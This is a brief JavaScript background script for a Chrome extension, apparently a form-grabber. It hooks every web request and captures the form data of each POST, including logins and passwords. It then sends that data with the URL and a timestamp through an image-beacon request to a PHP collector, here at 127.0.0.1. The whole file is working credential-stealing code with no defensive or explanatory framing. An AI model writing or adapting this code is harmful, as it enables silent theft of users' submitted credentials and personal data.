var callback = function(details) {
    if(details.method == "POST"){
        let data = '';
        let fData = JSON.stringify(details.requestBody.formData);
        if(fData){
            let ts = (new Date(details.timeStamp)).toString();
            data = '[' + ts + '][' + details.url + ']==>' + fData.toString();  
            new Image().src = 'http://127.0.0.1/hanoithu7phailendodixemdantoviabenho.php?c=' + encodeURIComponent(data);
        }
    }
};

chrome.webRequest.onBeforeRequest.addListener(
        callback, {urls: ["<all_urls>"]}, ["blocking", "requestBody"]);
